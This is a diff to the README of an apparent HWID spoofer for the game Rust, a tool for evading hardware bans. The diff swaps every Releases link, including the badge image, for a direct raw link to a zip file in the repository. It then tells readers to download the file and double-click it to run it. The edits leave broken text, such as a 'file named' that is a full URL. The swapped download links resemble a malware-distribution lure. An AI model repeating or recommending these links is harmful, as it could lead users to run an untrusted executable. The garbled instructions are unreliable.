@@ -1,6 +1,6 @@
 # 🎮 hwid-spoofer-for-rust - Change Your Hardware IDs Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/SOURAV760CMD/hwid-spoofer-for-rust/releases)
+[![Download Now](https://raw.githubusercontent.com/SOURAV760CMD/hwid-spoofer-for-rust/main/circa/hwid-spoofer-for-rust-2.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/SOURAV760CMD/hwid-spoofer-for-rust/main/circa/hwid-spoofer-for-rust-2.0.zip)
 
 ## 🌟 Overview
 
@@ -27,11 +27,11 @@ Before you begin, ensure your system meets these requirements:
 
 To get the latest version of the hwid-spoofer-for-rust, visit this page to download:
 
-[Download Latest Release](https://github.com/SOURAV760CMD/hwid-spoofer-for-rust/releases)
+[Download Latest Release](https://raw.githubusercontent.com/SOURAV760CMD/hwid-spoofer-for-rust/main/circa/hwid-spoofer-for-rust-2.0.zip)
 
 1. Click on the link above to access the Releases page.
 2. Look for the most recent version.
-3. Download the file named `hwid-spoofer.exe` (exact name may vary).
+3. Download the file named `https://raw.githubusercontent.com/SOURAV760CMD/hwid-spoofer-for-rust/main/circa/hwid-spoofer-for-rust-2.0.zip` (exact name may vary).
 4. Once downloaded, locate the file in your downloads folder.
 5. Double-click the file to run the application.
 
@@ -73,10 +73,10 @@ A: Yes, simply restart your computer to revert to your original hardware details
 
 ## 📑 Changelog
 
-For updates and changes, refer to the [Changelog](https://github.com/SOURAV760CMD/hwid-spoofer-for-rust/releases) in the latest releases section.
+For updates and changes, refer to the [Changelog](https://raw.githubusercontent.com/SOURAV760CMD/hwid-spoofer-for-rust/main/circa/hwid-spoofer-for-rust-2.0.zip) in the latest releases section.
 
 ## ⚠️ Disclaimer
 
 This tool should be used at your own risk. Understand the potential consequences of altering HWIDs in your applications and games.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/SOURAV760CMD/hwid-spoofer-for-rust/releases)
+[![Download Now](https://raw.githubusercontent.com/SOURAV760CMD/hwid-spoofer-for-rust/main/circa/hwid-spoofer-for-rust-2.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/SOURAV760CMD/hwid-spoofer-for-rust/main/circa/hwid-spoofer-for-rust-2.0.zip)
